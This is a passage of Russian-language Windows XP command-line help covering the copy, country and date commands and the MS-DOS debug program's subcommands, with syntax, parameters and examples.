- Необходимо задать преобразование диска при перезагрузке компьютера. В противном случае отсутствует возможность преобразовать текущий диск.- Если команда convert не может заблокировать диск (например системный том или текущий диск), выводится приглашение преобразовать диск при следующей перезагрузке компьютера.- Основная таблица файлов (MFT) имеет другое расположение в томах, преобразованных из предыдущей версии файловой системы NTFS, поэтому их быстродействие может уступать томам, преобразованным из Windows NT.- Тома, преобразованные из файловой системы FAT в NTFS, несколько уступают по быстродействию томам, непосредственно отформатированным в NTFS. В преобразованных томах основная таблица файлов (MFT) может оказаться фрагментированной. Кроме того, в преобразованных загрузочных томах разрешения на доступ NTFS недействительны после преобразования тома.
Примеры

Чтобы преобразовать тома на диске E в формат NTFS и вывести все сообщения, введите следующую команду:

convert e: /fs:ntfs /v
========================================================================================
Copy

Копирование одного или нескольких файлов из одного расположения в другое.
Синтаксис

copy [/d] [/v] [/n] [{/y|/-y}] [/z] [{/a|/b}] источник [{/a|/b}] [+ источник [{/a|/b}] [+ ...]] [назначение [{/a|/b}]]
Параметры

/d
    Сохранение копируемых шифрованных файлов как расшифрованных в месте назначения.
/v
    Проверка правильности копирования путем сравнения копий файлов.
/n
    Использование короткого имени (при наличии) копируемого файла, если его имя превышает 8 символов или его расширение превышает 3 символа.
/y
    Отмена вывода запроса на подтверждение перезаписи существующего конечного файла.
/-y
    Вывод запроса на подтверждение перезаписи существующего конечного файла.
/z
    Копирование файлов по сети в режиме перезапуска.
/a
    Указание текстового файла в формате ASCII. 
/b
    Указание двоичного файла.
источник
    Обязательный параметр. Задание расположение файла или набора файлов, которые требуется скопировать. Параметр источник может состоять из имени диска с двоеточием, имени папки, имени файла или их комбинации.
назначение
    Обязательный параметр. Задание расположения, в которое требуется скопировать файл или набор файлов. Параметр назначение может состоять из имени диска с двоеточием, имени папки, имени файла или их комбинации.
/?
    Отображение справки в командной строке.

Примечания
- Имеется возможность скопировать текстовый файл, в котором используется символ конца файла (CTRL+Z) для обозначения конца файла. - Использование параметра /a

Если параметр /a стоит перед списком файлов в командной строке, он применяется ко всем файлам, перечисленным до параметра /b команды copy. В этом случае /b применяется к файлу, предшествующему /b.

Если параметр /a стоит после списка файлов в командной строке, он применяется ко всем файлам, перечисленным до параметра /b команды copy. В этом случае /b применяется к файлу, предшествующему /b.

Результат применения параметра /a зависит от его положения в командной строке. Если параметр /a стоит после параметра источник, команда copy обрабатывает файл как текстовый в формате ASCII и копирует данные, которые находятся перед первым символом конца файла.

Если параметр /a расположен после параметра назначение, команда copy добавляет символ конца файла как последний символ файла.
- Использование параметра /b

Параметр /b задает считывание командным процессором количества байт, равного размеру файла в каталоге. Параметр /b задается по умолчанию для команды copy, за исключением случаев использования copy для слияния файлов.

Если параметр /b стоит перед списком файлов в командной строке, он применяется ко всем файлам, перечисленным до параметра /a команды copy. В этом случае /a применяется к файлу, предшествующему /a.

Если параметр /b стоит после списка файлов в командной строке, он применяется ко всем файлам, перечисленным до параметра /a команды copy. В этом случае /a применяется к файлу, предшествующему /a.

Результат применения параметра /b зависит от его положения в командной строке. Если параметр /b стоит после параметра источник, команда copy копирует файл целиком, включая все символы конца строки.

Если параметр /b стоит после параметра назначение, команда copy не добавляет символ конца строки.
- Использование параметра /v

Если операция записи не может быть проверена, выводится сообщение об ошибке. Хотя ошибки записи редко возникают при работе с командой copy, параметром /v можно воспользоваться для проверки правильности записи важных данных. Параметр /v также завершает работу команды copy, поскольку необходимо проверить каждый сектор, записанный на диск.
- Использование параметров /y и /-y

Если параметр /y установлен заранее в переменной среды COPYCMD, можно переопределить эту настройку, указав параметр /-y в командной строке. При переопределении данной настройки по умолчанию выводится запрос, за исключением исключением случаев выполнения команды copy в пакетном файле.
- Объединение файлов

Чтобы объединить файлы, укажите один файл в параметре назначение и несколько в параметре источник (используя подстановочные знаки или формат файл1+файл2+файл3).
- Использование параметра /z

Если во время фазы копирования теряется сетевое подключение (например, если сервер переходит в автономный режим, разрывая подключение), команда copy /z позволяет продолжить копирование после восстановления подключения. Кроме того, параметр /z позволяет отобразить сведения о завершении операции копирования в процентах для каждого файла.
- Использование внешних устройств в операциях копирования

В качестве параметров источник и назначение можно указать имена устройств.
- Использование параметра /b при копировании на устройство

Если в параметре назначение указано устройство (например Com1 или Lpt1), параметр /b позволяет скопировать данные на это устройство в двоичном режиме. В двоичном режиме команда copy /b копирует все символы (включая управляющие символы, такие как CTRL+C, CTRL+S, CTRL+Z и перевод строки) на устройство как данные. Однако если параметр /b не указан, данные копируются на устройство в формате ASCII. В этом режиме управляющие символы могут вызвать слияние файлов в системе Windows XP в процессе копирования. Дополнительные сведения см. в разделе «Слияние файлов».
- Использование стандартного имени конечного файла

Если конечный файл не задан, по умолчанию файлы будут скопированы с тем же именем, датой и временем создания в текущий каталог на текущем диске. Если исходный файл находится в текущем каталоге на текущем диске, выполнение команды copy завершается и выводится следующее сообщение об ошибке:

Невозможно скопировать файл в себя

Скопировано файлов: 0
- Слияние файлов

Если введено несколько параметров источник, разделенных знаком плюс (+), команда copy объединяет файлы в один. Если в параметре источник использованы подстановочные знаки (* или ?), а в параметре назначение задан один файл, команда copy объединит все файлы, удовлетворяющие шаблону в параметре источник, в один с именем, указанным в параметре назначение. В обоих случаях, если не задан параметр /b, команда copy объединяет файлы как текстовые.
- Копирование файлов нулевой длины

Команда Copy не копирует файлы, которые имеют длину, равную 0 байт. Для выполнения этой операции служит команда xcopy.
- Изменение даты и времени модификации файла

Если требуется установить текущую дату и время в качестве даты модификации файла без изменения его содержимого, воспользуйтесь следующим синтаксисом:

copy /b источник+,,

Запятые заменяют параметр назначение.
- Копирование файлов в подкаталогах

Для копирования всех файлов каталога и его подкаталогов служит команда xcopy. Дополнительные сведения о команде xcopy см. по ссылке «».
- Команда copy с другими параметрами доступна в консоли восстановления.
Примеры

Чтобы скопировать файл Memo.doc в файл Letter.doc на текущем диске и убедиться, что символ конца файла находится в конце скопированного файла, введите следующую команду:

copy memo.doc letter.doc /a

Чтобы скопировать файл Robin.typ с текущего каталога на текущем диске в существующий каталог Birds на диске C, введите следующую команду:

copy robin.typ c:\birds

Если каталог Birds не существует, файл Robin.typ будет скопирован в файл с именем Birds в корневой каталог диска C.

Чтобы скопировать несколько файлов в один, перечислите несколько файлов в параметре источник, разделяя их имена значком плюс (+), и укажите в параметре назначение файл, который должен содержать результат объединения этих файлов. Например, чтобы объединить файлы Mar89.rpt, Apr89.rpt и May89.rpt из текущего каталога на текущем диске и поместить их в файл Report в текущем каталоге на текущем диске, введите следующую команду:

copy mar89.rpt + apr89.rpt + may89.rpt report

При объединении команда copy создает конечный файл с текущими датой и временем. Если параметр назначение не указан, файлы объединяются и сохраняются в файле с именем первого файла в списке. Например, чтобы объединить четыре файла в файле Report, если такой файл уже существует, введите следующую команду:

copy report + mar89.rpt + apr89.rpt + may89.rpt

Кроме того, несколько файлов можно объединить в один с помощью символов подстановки (* или ?). Например, чтобы объединить все файлы с расширением .txt в текущем каталоге на текущем диске в файл Combin.doc, введите следующую команду:

copy *.txt combin.doc

Если требуется объединить несколько двоичных файлов в один с использованием подстановочных знаков, воспользуйтесь параметром /b. В результате CTRL+Z не будет рассматриваться как символ конца файла в Windows XP. Например, введите следующую команду:

copy /b *.exe combin.exe

Внимание!
- Если объединяются двоичные файлы, результат может оказаться непригодным из-за нарушения внутреннего форматирования.

В следующем примере команда copy объединяет каждый файл с расширением .txt с соответствующим ему файлом с расширением .ref. Результатом является файл с тем же именем, но с расширением .doc. Таким образом, команда copy объединит файлы File1.txt и File1.ref в файл File1.doc, затем файлы File2.txt и File2.ref в файл File2.doc и т. д. Например, введите следующую команду:

copy *.txt + *.ref *.doc

Чтобы объединить сначала все файлы с расширением .txt, а затем все файлы с расширением .ref в файл Combin.doc, введите следующую команду:

copy *.txt + *.ref combin.doc
========================================================================================
Country

Задание использования подсистемой MS-DOS международного формата для времени, дат, валют, разделителей и преобразования символов.
Синтаксис

country=xxx[,[yyy][,[диск:][путь] имя_файла]]
Параметры

xxx
    Задание кода страны.
yyy
    Задание кодовой страницы для данного кода страны.
[диск:][путь] имя_файла
    Задание местонахождения и имени файла, содержащего информацию о национальных форматах.
/?
    Отображение справки в командной строке.

Примечания
- Команда country обеспечивает распознавание подсистемой MS-DOS набора символов и соглашения о пунктуации при использовании одного из поддерживаемых национальных языков. Используйте файл %системный_корневой_каталог%\System32\Config.nt или эквивалентный файл запуска, указанный в PIF-файле программы, для загрузки настройки Код страны. - Установка поддерживаемых языков

В следующей таблице перечислены страны и языки, поддерживаемые подсистемой MS-DOS. В ней также перечислены кодовые страницы, которые могут быть использованы с этими кодами стран. Например, если используется код страны 003, при задании параметра yyy можно использовать только кодовые страницы 437 или 850. Первая из двух кодовых страниц, перечисленных для каждой страны/региона или языка, является кодовой страницей, используемой по умолчанию.
Страна/регион или язык     Код страны/региона     Кодовые страницы
США     001     437, 850
Французский (Канада)     002     863, 850
Голландия     031     850, 437
Бельгия     032     850, 437
Франция     033     850, 437
Испания     034     850, 437
Венгрия     036     852, 850
Италия     039     850, 437
Швейцария     041     850, 437
Чешская республика     042     852, 850
Словакия     042     852, 850
Великобритания     044     437, 850
Дания     045     850, 865
Швеция     046     850, 437
Норвегия     047     850, 865
Польша     048     852, 850
Германия     049     850, 437
Бразилия     055     850, 437
Международный английский     061     437, 850
Португалия     351     850, 860
Финляндия     358     850, 437
- Задание национального формата для времени и даты

Код страны задает формат времени и даты, используемый в следующих командах: backup, date и time.

В следующей таблице перечислены форматы даты и времени для каждого кода страны. Для каждого кода страны в соответствующих колонках представлена дата 3 января 1994г. и время 17 часов 35 минут (0 секунд и 0 сотых секунды).
Страна/регион или язык     Код страны/региона     Формат даты     Формат времени
США     001     01/03/1994     5:35:00.00p
Французский (Канада)     002     1994-01-03     17:35:00
Латинская америка     003     03/01/1994     5:35:00.00p
Голландия     031     03-01-94     17:35:00
Бельгия     032     03/01/94     17:35:00
Франция     033     03.01.1994     17:35:00
Испания     034     3/01/94     17:35:00
Венгрия     036     1994.01.03     17:35:00
Италия     039     03/01/94     17.35.00
Швейцария     041     03.01.94     17 35.00
Чешская республика     042     03.01.1994     17:35:00
Словакия     042     03.01.1994     17:35:00
Великобритания     044     03/01/94     17:35:00.00
Дания     045     03-01-94     17.35.00
Швеция     046     1994-01-03     17.35.00
Норвегия     047     03.01.94     17:35:00
Польша     048     1994-01-03     17:35:00
Германия     049     03.01.1994     17:35:00
Бразилия     055     03/01/94     17:35:00
Международный английский     061     03/01/1994     17:35:00.00
Португалия     351     03-01-1994     17:35:00
Финляндия     358     3.1.1994     17.35.00
Примеры

Чтобы преобразования валюты, времени, даты и символов в соответствии с французским национальным форматом, добавьте следующую команду в файл Config.nt:

country=033

Чтобы задать кодовую страницу вместе с кодом страны для Франции, введите следующую команду:

country=033,850

Если кодовая страница не задана, но введен параметр [диск:][путь] имя_файла, необходимо ввести запятую, предваряющую кодовую страницу, как показано в примере:

country=033,,c:\winnt\system32\country.sys
========================================================================================
Date

Отображение текущей настройки системной даты. Выполненная без параметров команда date выводит настройку текущей системной даты и приглашение ввести новую дату.
Синтаксис

date [мм-дд-гг] [/t]
Параметры

дд-мм-гг
    Установка указанной даты, где мм — месяц, дд — день, гг — год.
/t
    Вывод текущей даты без приглашения ввести новую дату. 
/?
    Отображение справки в командной строке.

Примечания
- Значения параметров мм, дд и гг должны быть разделены точкой (.), знаком переноса (-) или косой чертой (/). - Параметр мм может принимать значения от 1 до 12. - Параметр дд может принимать значения от 1 до 31. - Параметр гг может принимать значения от 80 до 99 или от 1980 до 2099. - Система Windows XP автоматически изменяет текущие месяц и год в зависимости от количества дней в месяце (28, 29, 30 или 31 день).
Примеры

Чтобы изменить дату на 3 августа 2000г., введите одну из следующих команд:

08.03.00

08-03-00

08/03/00

Чтобы вывести текущую системную дату, введите следующую команду:

date /t
========================================================================================
Debug

Запуск Debug.exe, программы для проверки и отладки исполнительных файлов MS-DOS. Выполненная без параметров команда debug запускает программу Debug.exe и выводит приглашение команды debug, представленное дефисом (-).
Синтаксис

debug [[диск:][путь] имя_файла [параметры]]
Параметры

[диск:][путь] имя_файла
    Задание расположения и имени исполняемого файла для тестирования.
параметры
    Указание параметров командной строки, передаваемых отлаживаемой программе.
?
    Вывод списка подкоманд команды debug.

Примечания
- Использование команд подсистемы MS-DOS

Команда debug — это команда подсистемы MS-DOS, которая выполняется в среде WOW/NTVDM.
- Разделитель параметров команды

Параметры можно вводить через запятые или пробелы, но это требуется только для шестнадцатеричных значений. Например, следующие команды эквивалентны:

dcs:100 110

d cs:100 110

d,cs:100,110
- Использование команд debug

Существует несколько команд debug, которыми можно воспользоваться. Дополнительные сведения о командах debug см. по ссылке «».
========================================================================================
Debug: a (assemble)

Создание двоичного кода процессоров 8086/8087/8088 непосредственно в памяти. Выполненная без параметров команда a начинает работу с точки последнего останова.
Синтаксис

a [адрес]
Параметры

адрес
    Задает адрес, по которому записаны инструкции на языке ассемблер. Параметр адрес принимает шестнадцатеричные значения без знака h.
?
    Вывод списка команд debug.

Примечания
- Задание правильных записей адреса

Адрес состоит из двух частей: первая содержит буквенное обозначение сегментного регистра или адрес сегмента из четырех цифр, а вторая содержит значение смещения. Адрес сегмента или сегментный регистр можно пропустить. По умолчанию для команд debug a, g, l, t, u и w адрес сегмента содержится в регистре CS. Для других подкоманд по умолчанию используется сегмент DS. Все числовые значения при этом представлены в шестнадцатеричном формате. Между именем сегмента и значением смещения следует вставлять двоеточие. Примеры правильных адресов:

CS:0100

04BA:0100
- Задание мнемоник префикса

Задайте мнемонику префикса инструкции перед кодом операции (т. е. opcode), к которой она относится. Команда a создает исполняемый машинный код из инструкций на языке ассемблера. Все числовые значения должны быть представлены в шестнадцатеричном формате и записаны как набор от 1 до 4 символов.
- Использование мнемоник

Мнемоники cs:, ds:, es: и ss:. Мнемоникой, вызывающей возврат управления в другой сегмент кода (far return), является retf. Мнемоники для работы со строками должны точно определять размер элементов строк. Например, для перемещения строк из слов (16 бит) следует использовать movsw, а для перемещения строк из байтов (8 бит) следует использовать movsb.
- Задание переходов и вызовы функций

Ассемблер автоматически обрабатывает переходы и вызовы (т. е. префиксы short, near или far ) в зависимости от смещения байтов. Имеется возможность переопределить переходы или вызовы с помощью префиксов near или far. Например:

-a0100:0500
0100:0500 jmp 502 ; короткий (short) переход на 2 байта
0100:0502 jmp near 505 ; ближний (near) переход на 3 байта
0100:0505 jmp far 50a ; длинный (far) переход на 5 байтов

Вместо префикса near можно использовать сокращение ne.
- Задание адреса слова или байта в памяти

Если операнды ссылаются на адреса слов или байтов в памяти, тип данных должен быть задан с использованием префикса word ptr или byte ptr, которые можно сократить до wo для word ptr и до by для byte ptr. Например:

dec wo [si]
neg byte ptr [128]
- Задание операндов

В программе Debug.exe используется общее соглашение о том, что операнды, указывающие на адрес в памяти, заключаются в квадратные скобки ([ ]). Это единственный способ, который позволяет различать непосредственные операнды и ссылки на области в памяти в Debug.exe. Например:

mov ax,21 ; загрузить число 21h в регистр AX
mov ax,[21] ; загрузить содержимое
; памяти по адресу 21h
; в регистр AX
- Псевдоинструкции

С командой a часто используются две псевдоинструкции: операция db, которая размещает байты непосредственно в памяти, и операция dw, которая размещает в памяти слова. Например:

db 1,2,3,4,"ЭТО ПРИМЕР"
db 'ЭТО КАВЫЧКА: "'
db "ЭТО КАВЫЧКА: '"
dw 1000,2000,3000,"BACH"
- Ввод данных в определенные байты

Дополнительные сведения о вводе данных в определенные байты с помощью команды e (enter) см. по ссылке «».
- Деассемблирование байт

Дополнительные сведения о деассемблировании байт с помощью команды u (unassemble) см. по ссылке «».
Примеры

Команда a допускает различное использование ссылок на регистры. Например:

add bx,34[bp+2].[si-1]
pop [bp+di]
push [si] )

Кроме того, команда a поддерживает использование синонимов дополнительных кодов операций: Например:

loopz 100
loope 100
ja 200
jnbe 200

Для дополнительных кодов операций процессора 8087 необходимо задать префиксы wait или fwait. Например:

fwait fadd st,st(3) ; эта строка вставляет
; в код префикса fwait
========================================================================================
Debug: c (compare)

Сравнение двух блоков памяти.
Синтаксис

c диапазон адрес
Параметры

диапазон
    Обязательный параметр. Задание начального и конечного адреса или начального адресы и длины первой области в памяти для сравнения.
адрес
    Обязательный параметр. Задание начального адреса второй области памяти для сравнения.
?
    Вывод списка команд debug.

Примечания
- Задание правильных записей диапазона

Параметр диапазон используется в командах debug для задания диапазона памяти. Для задания диапазона можно использовать один из следующих форматов: начальный и конечный адрес или начальный адрес и длина (разделяются символом l) диапазона. Например, обе следующих команды задают 16-разрядный диапазон, начинающийся с адреса CS:100:

cs:100 10f

cs:100 l 10
- Задание правильных записей адреса

Адрес состоит из двух частей: первая содержит буквенное обозначение сегментного регистра или адрес сегмента из четырех цифр, а вторая содержит значение смещения. Адрес сегмента или сегментный регистр могут быть пропущены. По умолчанию для команд debug a, g, l, t, u и w адрес сегмента содержится в регистре CS. Для других подкоманд по умолчанию используется сегмент DS. Все числовые значения при этом представлены в шестнадцатеричном формате. Между именем сегмента и значением смещения следует вставлять двоеточие. Следующие адреса являются допустимыми:

CS:0100

04BA:0100
- Если параметры диапазон и адрес совпадают, команда c ничего не выводит и возвращается к приглашению debug. Если при сравнении блоков памяти обнаружены различия, они выводятся командой c в следующем виде:

адрес1 байт1 байт2 адрес2
Примеры

Чтобы сравнить блок памяти от 100h до 10Fh с блоком памяти от 300h до 30Fh, введите следующую команду:

c100,10f 300

или

c100l10 300

Обе эти команды выведут следующие данные (предполагается, что DS = 197F):

197F:0100 4D E4 197F:0300
197F:0101 67 99 197F:0301
197F:0102 A3 27 197F:0302
197F:0103 35 F3 197F:0303
197F:0104 97 BD 197F:0304
197F:0105 04 35 197F:0305
197F:0107 76 71 197F:0307
197F:0108 E6 11 197F:0308
197F:0109 19 2C 197F:0309
197F:010A 80 0A 197F:030A
197F:010B 36 7F 197F:030B
197F:010C BE 22 197F:030C
197F:010D 83 93 197F:030D
197F:010E 49 77 197F:030E
197F:010F 4F 8A 197F:030F

Адреса 197F:0106 и 197F:0306 отсутствуют в списке. Это означает, что значения, расположенные по этим адресам, совпадают.
========================================================================================
Debug: d (dump)

Просмотр содержимого заданного диапазона адресов памяти. Выполненная без параметров команда d выводит на экран содержимое 128 байт, начиная с конца диапазона адресов, заданного в предыдущей команде d.
Синтаксис

d [диапазон]
Параметры

диапазон
    Задание начального и конечного адреса или начального адреса и длины блока памяти для просмотра его содержимого.
?
    Вывод списка команд debug.

Примечания
- Задание правильных записей диапазона

Параметр диапазон используется в подкомандах debug для задания диапазона памяти. Параметр диапазон можно задать в одном из следующих форматов: начальный адрес и конечный адрес или начальный адрес и длина (обозначаемая l) диапазона. Например, оба следующих выражения задают диапазон из 16 байтов, начинающийся с адреса CS:100:

cs:100 10f

cs:100 l 10
- Если используется подкоманда d, содержимое памяти выводится командой Debug.exe двумя частями: шестнадцатеричной (каждый байт представлен в шестнадцатеричном формате) и текстовой (каждый байт представлен символом ASCII). Непечатаемые символы отображаются точкой (.) в текстовой части. Каждая строка на экране представляет содержимое 16 байт со знаком тире между восьмым и девятым байтом. Все строки начинаются на 16-ти байтной границе. - Сведения об отображении содержимого регистров с помощью подкоманды r (register) см. по ссылке «».
Примеры

Введите следующую команду:

dcs:100 10f

Команда debug.exe выводит содержимое диапазона в следующем формате:

04BA:0100 54 4F 4D 00 53 41 57 59-45 52 00 00 00 00 00 00.....

Команда Debug.exe выводит сведения в таком формате, если подкоманда d выполнена без параметров. Каждая строка на экране начинается с адреса, который отстоит от адреса предыдущей строки на 16 байт (или на 8 байт для экрана с 40 колонками). Для каждой последующей подкоманды d, вводимой без параметров, Debug.exe выводит следующую часть сведений непосредственно за предыдущей.

Чтобы вывести содержимое 20h байт, начиная с CS:100, введите следующую команду:

dcs:100 l 20

Чтобы вывести содержимое всех байт в диапазоне от 100h до 115h в сегменте CS, введите следующую команду:

dcs:100 115
========================================================================================
Debug: e (enter)

Ввод данных в память по заданному адресу.
Синтаксис

e адрес [список]
Параметры

адрес
    Обязательный параметр. Адрес начала области памяти для ввода данных.
список
    Задание списка байтов, которые требуется ввести в память.
?
    Вывод списка подкоманд debug.

Примечания
- Задание правильных записей адреса

Адрес состоит из двух частей: первая содержит буквенное обозначение сегментного регистра или адрес сегмента из четырех цифр, а вторая содержит значение смещения. Адрес сегмента или сегментный регистр могут быть пропущены. По умолчанию для подкоманд a, g, l, t, u и w команды debug адрес сегмента содержится в регистре CS. Для других подкоманд по умолчанию используется сегмент DS. Все числовые значения при этом представлены в шестнадцатеричном формате. Между именем сегмента и значением смещения следует вставлять двоеточие. Следующие адреса являются допустимыми:

CS:0100

04BA:0100
- Использование параметра адрес

При задании параметра адрес без указания параметра список Debug.exe выведет на экран адрес и его содержимое, затем повторит адрес на следующей строке и будет ждать ввода новой команды. В этот момент можно выполнить одно из следующих действий.
- Заменить байт данных. Для этого введите новое значение. Если введенное значение не является допустимым шестнадцатеричным числом или содержит более двух цифр, Debug.exe не выводит на экран неверные или избыточные символы.- Перейти к следующему байту. Для этого нажмите клавишу ПРОБЕЛ. Для изменения данного байта введите новое значение после текущего. Если при нажатии клавиши ПРОБЕЛ пройдена 8-байтная граница, Debug.exe выводит на экран новую строку с новым адресом в начале строки.- Возвратиться к предыдущему байту. Для этого нажмите клавишу МИНУС. Для перемещения назад более чем на один байт нажмите эту клавишу несколько раз. При нажатии клавиши МИНУС Debug.exe выводит новую строку с текущим адресом и значением.-Остановить выполнение подкоманды e. Для этого нажмите клавишу ENTER. Это можно сделать в любой позиции курсора. - Использование параметра список

Если введен параметр список, подкоманда e последовательно заменяет существующие значения значениями из списка. При возникновении ошибки никакие значения не будут изменены.

Список может быть задан как шестнадцатеричными числами, так и строкой. При этом числа разделяются пробелами, запятыми или символами табуляции. Строки необходимо заключать в апострофы (т. е. 'строка') или кавычки (т. е. "строка").
- Создание двоичного кода

Сведения о создании двоичного кода с помощью подкоманды a (assemble) см. по ссылке «».
- Просмотр содержимого области памяти

Сведения о просмотре содержимого области памяти с помощью подкоманды d (dump) см. по ссылке «».
Примеры

Введите следующую команду:

ecs:100

Debug.exe выведет содержимое первого байта в следующем формате:

04BA:0100 EB._

Чтобы заменить это значение числом 41, введите 41 в позицию курсора, как показано ниже:

04BA:0100 EB.41_

Последовательность байтов можно ввести в одной подкоманде e. Вместо нажатия клавиши ENTER после нового значения, нажмите клавишу ПРОБЕЛ. Программа Debug.exe выведет следующее значение. В данном примере, если клавиша ПРОБЕЛ нажата три раза, Debug.exe выведет на экран следующие значения:

04BA:0100 EB.41 10. 00. BC._

Чтобы заменить шестнадцатеричное значение BC числом 42, введите 42 в позицию курсора, как показано ниже:

04BA:0100 EB.41 10. 00. BC.42_

Чтобы изменить значение 10 на 6F, дважды нажмите клавишу МИНУС для возврата к адресу 0101 (значение 10). Программа Debug.exe выводит следующие сведения:

04BA:0100 EB.41 10. 00. BC.42-
04BA:0102 00.-
04BA:0101 10._

Введите 6F в позицию курсора для изменения значения, как показано ниже:

04BA:0101 10.6F_

Нажмите клавишу ENTER для завершения выполнения подкоманды e и возврата к приглашению программы debug.

Рассмотрим пример ввода строковой величины:

eds:100 "Это пример текста"

Эта строка будет занимать 24 байта, начиная с адреса DS:100.
========================================================================================
Debug: f (fill)

Заполнение адресов в определенной области памяти заданными значениями.
Синтаксис

f диапазон список
Параметры

диапазон
    Обязательный параметр. Задание начального и конечного адреса или начального адреса и длины области памяти, которую требуется заполнить.
список
    Обязательный параметр. Задание данных, которые требуется ввести.
?
    Вывод списка подкоманд debug.

Примечания
- Задание правильных записей диапазона

Параметр диапазон используется в подкомандах debug для задания диапазона памяти. Параметр диапазон можно задать в одном из следующих форматов: начальный адрес и конечный адрес или начальный адрес и длина (обозначаемая l) диапазона. Например, оба следующих выражения задают диапазон из 16 байтов, начинающийся с адреса CS:100:

cs:100 10f

cs:100 l 10
- Задание данных

Данные можно задать в шестнадцатеричном или текстовом формате. Данные, ранее находившиеся по данному адресу, будут удалены.
- Использование параметра список

Список может состоять из шестнадцатеричных чисел или строки, заключенной в кавычки (т. е. "строка").
Примеры

Чтобы заполнить область памяти с 04BA:100 по 04BA:1FF пятью определенными значениями (например 42, 45, 52, 54, 41) и повторять этот набор, пока 100h байт не будут заполнены программой Debug.exe, введите следующую команду:

f04ba:100l100 42 45 52 54 41
========================================================================================
Debug: g (go)

Выполнение загруженной программы. Запущенная без параметров подкоманда g начинает выполнение с текущего адреса в реестрах CS:IP.
Синтаксис

g [=адрес] [точки_останова]
Параметры

адрес
    Задание адреса в памяти, с которого требуется начать выполнение программы. 
точки_останова
    Указание до 10 временных точек останова, которые могут быть заданы как часть подкоманды g.
?
    Вывод списка подкоманд debug.

Примечания
- Задание правильных записей адреса

Адрес состоит из двух частей: первая содержит буквенное обозначение сегментного регистра или адрес сегмента из четырех цифр, а вторая содержит значение смещения. Адрес сегмента или сегментный регистр могут быть пропущены. По умолчанию для подкоманд a, g, l, t, u и w команды debug адрес сегмента содержится в регистре CS. Для других подкоманд по умолчанию используется сегмент DS. Все числовые значения при этом представлены в шестнадцатеричном формате. Между именем сегмента и значением смещения следует вставлять двоеточие. Следующие адреса являются допустимыми:

CS:0100

04BA:0100
- Использование параметра адрес

Введите знак равенства (=) перед параметром адрес, чтобы отличить адрес от адресов точек останова (точки_останова).
- Задание точек останова

Выполнение программы будет остановлено в первой встретившейся точке останова, независимо от расположения этой точки останова в списке параметра точки_останова. Debug.exe заменяет код, находящийся в точках останова, на инструкции прерывания.

Когда выполнение программы дошло до точки останова, Debug.exe восстанавливает код в точках останова и выводит на экран содержимое всех регистров, все флаги состояния и деассемблированную инструкцию, которая была выполнена последней. Debug.exe выводит те же сведения, которые получают при использовании полкоманды r (регистр) и указании адреса данной точки останова.

Если программа не остановлена ни в одной точке, Debug.exe не заменяет коды прерываний первоначальными инструкциями.

Точки останова могут быть установлены только по адресам, содержащим первый байт кода операции 8086 (opcode). Если установлено больше 10 точек останова, выводится следующее сообщение:

bp Error
- Использование указателя на стек, задаваемый пользователем

Указатель на стек, задаваемый пользователем, должен быть допустимым, а емкость стека должна быть не менее 6 байт для подкоманды g. Для перехода к тестируемой программе в подкоманде g используется инструкция iret. Debug.exe устанавливает указатель на стек пользователя, помещает туда пользовательские флаги состояния, значение регистра кодового сегмента и указатель на текущую команду. (Если заданный пользователем стек неверен или имеет недостаточный объем, возможен сбой в операционной системе). Debug.exe записывает код прерывания (т. е. 0CCh) в указанные точки останова или адреса.
- Перезапуск программы

Не перезапускайте программу при получении следующего сообщения:

Program terminated normally

Чтобы правильно запустить программу, перезагрузите ее с помощью подкоманд n (name) и l (load).
- Для получения дополнительных сведений о выполнении циклов, строковых инструкций, программных прерываний и процедур с помощью подкоманды p (proceed) щелкните ссылку «». - Сведения о выполнении одной инструкции с помощью подкоманды t (trace) см. по ссылке «».
Примеры

Чтобы запустить текущую программу и выполнить ее до точки останова по адресу 7550 в сегменте CS, введите следующую команду.

gcs:7550

Debug.exe выведет на экран содержимое регистров и состояние флагов, а затем остановит подкоманду g.

Чтобы установить две точки останова, введите следующую команду:

gcs:7550, cs:8000

Если подкоманда g введена снова после остановки в точке останова, выполнение начнется с инструкции, следующей за точкой останова, а не с обычного адреса начала программы.
========================================================================================
Debug: h (hexadecimal)

Выполнение шестнадцатеричных арифметических операций над двумя заданными числами.
Синтаксис

h число1 число2
Параметры

число1
    Обязательный параметр. Первое шестнадцатеричное число в диапазоне от 0 до FFFFh.
число2
    Обязательный параметр. Второе шестнадцатеричное число в диапазоне от 0 до FFFFh.
?
    Вывод списка подкоманд debug.

Заметки
- В программе Debug.exe два введенных числа складываются, а затем вычисляется их разность. Результаты вычислений выводятся в одной строке — вначале сумма, затем разность.
Примеры

Введите следующую команду:

h19f 10a

Результаты вычислений Debug.exe будут выведены в виде:

02A9 0095
========================================================================================
Debug: i (input)

Считывание и вывод на экран одного байта из указанного порта ввода.
Синтаксис

i порт
Параметры

порт
    Обязательный параметр. Задание порта ввода адресом. Адрес может быть 16-битным значением.
?
    Вывод списка подкоманд debug.

Заметки
- Сведения об отправке байта в порт вывода с помощью подкоманды o (output) см. по ссылке «».
Примеры

Введите следующую команду:

i2f8

Если находящаяся в порту величина равна 42h, Debug.exe считает ее и выведет в следующем виде:

42
========================================================================================
Debug: l (load)

Загрузка файла или содержимого сектора диска в память. Выполненная без параметров подкоманда l загружает файл, указанный в командной строке программы debug, в память, начиная с адреса CS:100. В регистрах BX и CX указывается количество загруженных байт. Если имя файла не было задано в командной строке debug, используется файл, ранее заданный при вызове последней подкоманды n.
Синтаксис

l [адрес]

l [адрес] [диск] [первый_сектор] [число]
Параметры

адрес
    Задание адреса области памяти, в которую требуется загрузить содержимое файла или сектора. Если параметр адрес не задан, используется текущий адрес в регистре CS. 
диск
    Задание накопителя, содержащего диск, с которого считываются определенные сектора. Данный параметр задается числом: 0 = A, 1 = B, 2 = C и т. д. 
первый_сектор
    Задание шестнадцатеричного номера первого сектора, содержимое которого требуется загрузить.
число
    Задание шестнадцатеричного числа последовательных секторов, содержимое которых требуется загрузить. Параметры диск, первый_сектор и число используются только в том случае, когда необходимо загрузить содержимое определенных секторов, а не файл, указанный в командной строке debug или в последней подкоманде n (name).
?
    Вывод списка подкоманд debug.

Заметки
- Для загрузки задаваемого регистрами BX:CX числа байтов из файла на диске используется следующий синтаксис:

l [адрес]
- Для пропуска файловой системы и прямой загрузки указанных секторов используется следующий синтаксис:

l [адрес] [диск] [первый_сектор] [число]
- Задание правильных записей адреса

